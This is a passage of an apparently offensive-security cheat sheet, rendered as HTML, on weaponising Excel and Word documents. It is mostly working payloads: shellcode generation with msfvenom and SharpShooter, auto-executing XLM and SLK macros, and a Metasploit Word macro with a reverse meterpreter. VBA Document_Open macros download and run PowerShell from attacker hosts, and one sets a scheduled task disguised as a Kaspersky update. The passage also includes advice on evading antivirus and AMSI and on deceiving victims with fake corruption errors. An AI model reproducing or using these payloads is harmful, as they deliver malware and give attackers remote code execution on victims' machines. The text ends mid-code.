<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">generic</span><span class="p">/</span><span class="n">custom</span> <span class="n">PAYLOADFILE</span><span class="p">=</span><span class="n">payload86</span><span class="p">.</span><span class="n">bin</span> <span class="n">-a</span> <span class="n">x86</span> <span class="p">-</span><span class="n">-platform</span> <span class="n">windows</span> <span class="n">-e</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span> <span class="o">-f</span> <span class="n">raw</span> <span class="n">-o</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">shellcode</span><span class="p">-</span><span class="n">86</span><span class="p">.</span><span class="n">bin</span> <span class="n">-b</span> <span class="s1">&#39;\x00&#39;</span>
<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="n">SharpShooter</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-payload</span> <span class="n">slk</span> <span class="p">-</span><span class="n">-output</span> <span class="n">foo</span> <span class="p">-</span><span class="n">-rawscfile</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">shellcode</span><span class="p">-</span><span class="n">86</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-smuggle</span> <span class="p">-</span><span class="n">-template</span> <span class="n">mcafee</span>
</code></pre></div>
<h3 id="xlm-excel-40-excelntdonut">XLM Excel 4.0 - EXCELntDonut</h3>
<ul>
<li>XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.</li>
<li>AMSI has no visibility into XLM macros (for now)</li>
<li>Anti-virus struggles with XLM (for now)</li>
<li>
<p>XLM macros can access the Win32 API (virtualalloc, createthread, ...)</p>
</li>
<li>
<p>Open an Excel Workbook.</p>
</li>
<li>Right click on "Sheet 1" and click "Insert...". Select "MS Excel 4.0 Macro".</li>
<li>Open your EXCELntDonut output file in a text editor and copy everything.</li>
<li>Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.</li>
<li>At this point, everything is in column A. To fix that, we'll use the "Text-to-Columns"/"Convert" tool under the "Data" tab.</li>
<li>Highlight column A and open the "Text-to-Columns"  tool. Select "Delimited" and then "Semicolon" on the next screen. Select "Finished".</li>
<li>Right-click on cell A1* and select "Run". This will execute your payload to make sure it works.</li>
<li>To enable auto-execution, we need to rename cell A1<em> to "Auto_Open". You can do this by clicking into cell A1 and then clicking into the box that says "A1"</em> just above Column A. Change the text from "A1"* to "Auto_Open". Save the file and verify that auto-execution works.</li>
</ul>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> If you're using the obfuscate flag, after the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete steps 6-7 substituting HJ1 for A1</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">FortyNorthSecurity</span><span class="p">/</span><span class="n">EXCELntDonut</span>
<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">-f</span> <span class="n">path</span> <span class="n">to</span> <span class="n">file</span> <span class="n">containing</span> <span class="n">your</span> <span class="n">C</span><span class="c"># source code (exe or dll)</span>
<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">-c</span> <span class="n">ClassName</span> <span class="nb">where </span><span class="n">method</span> <span class="n">that</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">call</span> <span class="n">lives</span> <span class="p">(</span><span class="n">dll</span><span class="p">)</span>
<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">-m</span> <span class="n">Method</span> <span class="n">containing</span> <span class="n">your</span> <span class="n">executable</span> <span class="n">payload</span> <span class="p">(</span><span class="n">dll</span><span class="p">)</span>
<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">-r</span> <span class="n">References</span> <span class="n">needed</span> <span class="n">to</span> <span class="n">compile</span> <span class="n">your</span> <span class="n">C</span><span class="c"># code (ex: -r &#39;System.Management&#39;)</span>
<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="n">-o</span> <span class="n">output</span> <span class="n">filename</span>
<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="p">-</span><span class="n">-sandbox</span> <span class="n">Perform</span> <span class="n">basic</span> <span class="n">sandbox</span> <span class="n">checks</span><span class="p">.</span> 
<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="p">-</span><span class="n">-obfuscate</span> <span class="n">Perform</span> <span class="n">basic</span> <span class="n">macro</span> <span class="n">obfuscation</span><span class="p">.</span> 
<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="c"># Fork</span>
<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">d-sec-net</span><span class="p">/</span><span class="n">EXCELntDonut</span><span class="p">/</span><span class="n">blob</span><span class="p">/</span><span class="n">master</span><span class="p">/</span><span class="n">EXCELntDonut</span><span class="p">/</span><span class="n">drive</span><span class="p">.</span><span class="n">py</span>
<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-platform</span><span class="p">:</span><span class="n">x64</span> <span class="n">-out</span><span class="p">:</span><span class="n">GruntHttpX64</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">covenSource</span><span class="p">.</span><span class="n">cs</span> 
<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-platform</span><span class="p">:</span><span class="n">x86</span> <span class="n">-out</span><span class="p">:</span><span class="n">GruntHttpX86</span><span class="p">.</span><span class="n">exe</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">covenSource</span><span class="p">.</span><span class="n">cs</span>
<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="n">donut</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a1</span> <span class="n">-o</span> <span class="n">GruntHttpx86</span><span class="p">.</span><span class="n">bin</span> <span class="n">GruntHttpX86</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a><span class="n">donut</span><span class="p">.</span><span class="n">exe</span> <span class="n">-a2</span> <span class="n">-o</span> <span class="n">GruntHttpx64</span><span class="p">.</span><span class="n">bin</span> <span class="n">GruntHttpX64</span><span class="p">.</span><span class="n">exe</span>
<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="n">usage</span><span class="p">:</span> <span class="n">drive</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">-</span><span class="n">-x64bin</span> <span class="n">X64BIN</span> <span class="p">-</span><span class="n">-x86bin</span> <span class="n">X86BIN</span> <span class="p">[</span><span class="n">-o</span> <span class="n">OUTPUTFILE</span><span class="p">]</span> <span class="p">[-</span><span class="n">-sandbox</span><span class="p">]</span> <span class="p">[-</span><span class="n">-obfuscate</span><span class="p">]</span>
<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="n">python3</span> <span class="n">drive</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-x64bin</span> <span class="n">GruntHttpx64</span><span class="p">.</span><span class="n">bin</span> <span class="p">-</span><span class="n">-x86bin</span> <span class="n">GruntHttpx86</span><span class="p">.</span><span class="n">bin</span>
</code></pre></div>
<p>XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md</p>
<h3 id="xlm-excel-40-exec">XLM Excel 4.0 - EXEC</h3>
<ol>
<li>Right Click to the current sheet</li>
<li>Insert a <strong>Macro IntL MS Excel 4.0</strong></li>
<li>Add the <code>EXEC</code> macro
    <div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">=</span><span class="n">EXEC</span><span class="p">(</span><span class="s2">&quot;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&quot;</span><span class="p">)</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="p">=</span><span class="n">halt</span><span class="p">()</span>
</code></pre></div></li>
<li>Rename cell to <strong>Auto_open</strong></li>
<li>Hide your macro worksheet by a right mouse click on the sheet name <strong>Macro1</strong> and selecting <strong>Hide</strong></li>
</ol>
<h3 id="slk-exec">SLK - EXEC</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">ID</span><span class="p">;</span><span class="n">P</span>
<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">O</span><span class="p">;</span><span class="n">E</span>
<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="n">NN</span><span class="p">;</span><span class="n">NAuto_open</span><span class="p">;</span><span class="n">ER101C1</span><span class="p">;</span><span class="n">KOut</span> <span class="n">Flank</span><span class="p">;</span><span class="n">F</span>
<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">C</span><span class="p">;</span><span class="n">X1</span><span class="p">;</span><span class="n">Y101</span><span class="p">;</span><span class="n">K0</span><span class="p">;</span><span class="n">EEXEC</span><span class="p">(</span><span class="s2">&quot;c:\shell.cmd&quot;</span><span class="p">)</span>
<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="n">C</span><span class="p">;</span><span class="n">X1</span><span class="p">;</span><span class="n">Y102</span><span class="p">;</span><span class="n">K0</span><span class="p">;</span><span class="n">EHALT</span><span class="p">()</span>
<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="n">E</span>
</code></pre></div>
<h2 id="word">Word</h2>
<h3 id="docm-metasploit">DOCM - Metasploit</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">use</span> <span class="n">exploit</span><span class="p">/</span><span class="n">multi</span><span class="p">/</span><span class="n">fileformat</span><span class="p">/</span><span class="n">office_word_macro</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">set </span><span class="n">payload</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_http</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="nb">set </span><span class="n">LHOST</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="nb">set </span><span class="n">LPORT</span> <span class="n">80</span>
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="nb">set </span><span class="n">DisablePayloadHandler</span> <span class="n">True</span>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="nb">set </span><span class="n">PrependMigrate</span> <span class="n">True</span>
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="nb">set </span><span class="n">FILENAME</span> <span class="n">Financial2021</span><span class="p">.</span><span class="n">docm</span>
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">exploit</span> <span class="n">-j</span>
</code></pre></div>
<h3 id="docm-download-and-execute">DOCM - Download and Execute</h3>
<blockquote>
<p>Detected by Defender (AMSI)</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="n">Sub</span> <span class="n">Execute</span><span class="p">()</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="n">Dim</span> <span class="n">payload</span>
<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">payload</span> <span class="p">=</span> <span class="s2">&quot;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&quot;</span>
<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Call</span> <span class="n">Shell</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">vbHide</span><span class="p">)</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">Sub</span> <span class="n">Document_Open</span><span class="p">()</span>
<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">Execute</span>
<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="k">End</span> <span class="n">Sub</span>
</code></pre></div>
<h3 id="docm-macro-creator">DOCM - Macro Creator</h3>
<ul>
<li>https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator</li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c"># Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-MacroCreator</span> <span class="n">-i</span> <span class="n">meterpreter_shellcode</span><span class="p">.</span><span class="n">raw</span> <span class="n">-t</span> <span class="n">shellcode</span> <span class="n">-d</span> <span class="n">body</span>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c"># Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion:</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">C</span><span class="p">:\</span><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-MacroCreator</span> <span class="n">-i</span> <span class="n">meterpreter_shellcode</span><span class="p">.</span><span class="n">raw</span> <span class="n">-t</span> <span class="n">shellcode</span> <span class="n">-url</span> <span class="n">webdavserver</span><span class="p">.</span><span class="n">com</span> <span class="n">-d</span> <span class="n">webdav</span> <span class="n">-o</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c"># Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:</span>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">C</span><span class="p">:\</span><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Invoke-MacroCreator</span> <span class="n">-i</span> <span class="n">regsvr32</span><span class="p">.</span><span class="n">sct</span> <span class="n">-t</span> <span class="n">file</span> <span class="n">-url</span> <span class="s1">&#39;http://my.server.com/sources.xml&#39;</span> <span class="n">-d</span> <span class="n">biblio</span> <span class="n">-c</span> <span class="s1">&#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39;</span> <span class="n">-o</span> <span class="n">-e</span>
</code></pre></div>
<h3 id="docm-c-converted-to-office-vba-macro">DOCM - C# converted to Office VBA macro</h3>
<blockquote>
<p>A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.</p>
</blockquote>
<p>https://github.com/trustedsec/unicorn</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">python</span> <span class="n">unicorn</span><span class="p">.</span><span class="n">py</span> <span class="n">payload</span><span class="p">.</span><span class="n">cs</span> <span class="n">cs</span> <span class="n">macro</span>
</code></pre></div>
<h3 id="docm-vba-wscript">DOCM - VBA Wscript</h3>
<blockquote>
<p>https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office</p>
</blockquote>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">Sub</span> <span class="n">parent_change</span><span class="p">()</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    <span class="n">Dim</span> <span class="n">objOL</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    <span class="nb">Set </span><span class="n">objOL</span> <span class="p">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Outlook.Application&quot;</span><span class="p">)</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>    <span class="nb">Set </span><span class="n">shellObj</span> <span class="p">=</span> <span class="n">objOL</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Wscript.Shell&quot;</span><span class="p">)</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>    <span class="n">shellObj</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="s2">&quot;notepad.exe&quot;</span><span class="p">)</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="n">Sub</span> <span class="n">AutoOpen</span><span class="p">()</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    <span class="n">parent_change</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="n">Sub</span> <span class="n">Auto_Open</span><span class="p">()</span>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>    <span class="n">parent_change</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="k">End</span> <span class="n">Sub</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot;
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot;
</code></pre></div>
<h3 id="docm-vba-shell-execute-comment">DOCM - VBA Shell Execute Comment</h3>
<p>Set your command payload inside the <strong>Comment</strong> metadata of the document.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Sub beautifulcomment()
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>    Dim p As DocumentProperty
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>    For Each p In ActiveDocument.BuiltInDocumentProperties
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>        If p.Name = &quot;Comments&quot; Then
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>            Shell (p.Value)
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>        End If
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>    Next
<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>End Sub
<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>
<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>Sub AutoExec()
<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>    beautifulcomment
<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>End Sub
<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>
<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>Sub AutoOpen()
<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>    beautifulcomment
<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>End Sub
</code></pre></div>
<h3 id="docm-vba-spawning-via-svchostexe-using-scheduled-task">DOCM - VBA Spawning via svchost.exe using Scheduled Task</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">Sub</span> <span class="n">AutoOpen</span><span class="p">()</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>    <span class="nb">Set </span><span class="n">service</span> <span class="p">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;Schedule.Service&quot;</span><span class="p">)</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>    <span class="n">Call</span> <span class="n">service</span><span class="p">.</span><span class="n">Connect</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>    <span class="n">Dim</span> <span class="n">td</span><span class="p">:</span> <span class="nb">Set </span><span class="n">td</span> <span class="p">=</span> <span class="n">service</span><span class="p">.</span><span class="n">NewTask</span><span class="p">(</span><span class="n">0</span><span class="p">)</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    <span class="n">td</span><span class="p">.</span><span class="n">RegistrationInfo</span><span class="p">.</span><span class="n">Author</span> <span class="p">=</span> <span class="s2">&quot;Kaspersky Corporation&quot;</span>
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>    <span class="n">td</span><span class="p">.</span><span class="n">settings</span><span class="p">.</span><span class="n">StartWhenAvailable</span> <span class="p">=</span> <span class="n">True</span>
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>    <span class="n">td</span><span class="p">.</span><span class="n">settings</span><span class="p">.</span><span class="n">Hidden</span> <span class="p">=</span> <span class="n">False</span>
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>    <span class="n">Dim</span> <span class="n">triggers</span><span class="p">:</span> <span class="nb">Set </span><span class="n">triggers</span> <span class="p">=</span> <span class="n">td</span><span class="p">.</span><span class="n">triggers</span>
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>    <span class="n">Dim</span> <span class="n">trigger</span><span class="p">:</span> <span class="nb">Set </span><span class="n">trigger</span> <span class="p">=</span> <span class="n">triggers</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">1</span><span class="p">)</span>
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>    <span class="n">Dim</span> <span class="n">startTime</span><span class="p">:</span> <span class="n">ts</span> <span class="p">=</span> <span class="n">DateAdd</span><span class="p">(</span><span class="s2">&quot;s&quot;</span><span class="p">,</span> <span class="n">30</span><span class="p">,</span> <span class="n">Now</span><span class="p">)</span>
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>    <span class="n">startTime</span> <span class="p">=</span> <span class="n">Year</span><span class="p">(</span><span class="n">ts</span><span class="p">)</span> <span class="p">&amp;</span> <span class="s2">&quot;-&quot;</span> <span class="p">&amp;</span> <span class="n">Right</span><span class="p">(</span><span class="n">Month</span><span class="p">(</span><span class="n">ts</span><span class="p">),</span> <span class="n">2</span><span class="p">)</span> <span class="p">&amp;</span> <span class="s2">&quot;-&quot;</span> <span class="p">&amp;</span> <span class="n">Right</span><span class="p">(</span><span class="n">Day</span><span class="p">(</span><span class="n">ts</span><span class="p">),</span> <span class="n">2</span><span class="p">)</span> <span class="p">&amp;</span> <span class="s2">&quot;T&quot;</span> <span class="p">&amp;</span> <span class="n">Right</span><span class="p">(</span><span class="n">Hour</span><span class="p">(</span><span class="n">ts</span><span class="p">),</span> <span class="n">2</span><span class="p">)</span> <span class="p">&amp;</span> <span class="s2">&quot;:&quot;</span> <span class="p">&amp;</span> <span class="n">Right</span><span class="p">(</span><span class="n">Minute</span><span class="p">(</span><span class="n">ts</span><span class="p">),</span> <span class="n">2</span><span class="p">)</span> <span class="p">&amp;</span> <span class="s2">&quot;:&quot;</span> <span class="p">&amp;</span> <span class="n">Right</span><span class="p">(</span><span class="n">Second</span><span class="p">(</span><span class="n">ts</span><span class="p">),</span> <span class="n">2</span><span class="p">)</span>
<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>    <span class="n">trigger</span><span class="p">.</span><span class="n">StartBoundary</span> <span class="p">=</span> <span class="n">startTime</span>
<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>    <span class="n">trigger</span><span class="p">.</span><span class="n">ID</span> <span class="p">=</span> <span class="s2">&quot;TimeTriggerId&quot;</span>
<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>    <span class="n">Dim</span> <span class="n">Action</span><span class="p">:</span> <span class="nb">Set </span><span class="n">Action</span> <span class="p">=</span> <span class="n">td</span><span class="p">.</span><span class="n">Actions</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">0</span><span class="p">)</span>
<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>    <span class="n">Action</span><span class="p">.</span><span class="n">Path</span> <span class="p">=</span> <span class="s2">&quot;C:\Windows\System32\powershell.exe&quot;</span>
<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>    <span class="n">Action</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s2">&quot;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot;</span>
<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>    <span class="n">Call</span> <span class="n">service</span><span class="p">.</span><span class="n">GetFolder</span><span class="p">(</span><span class="s2">&quot;\&quot;</span><span class="p">).</span><span class="n">RegisterTaskDefinition</span><span class="p">(</span><span class="s2">&quot;AVUpdateTask&quot;</span><span class="p">,</span> <span class="n">td</span><span class="p">,</span> <span class="n">6</span><span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="n">3</span><span class="p">)</span>
<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="k">End</span> <span class="n">Sub</span>
<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="n">Rem</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-c</span> <span class="s2">&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot;</span>
</code></pre></div>
<h3 id="docm-wmi-com-functions">DOCM - WMI COM functions</h3>
<p>Basic WMI exec (detected by Defender) : <code>r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">Sub</span> <span class="n">wmi_exec</span><span class="p">()</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>    <span class="n">strComputer</span> <span class="p">=</span> <span class="s2">&quot;.&quot;</span>
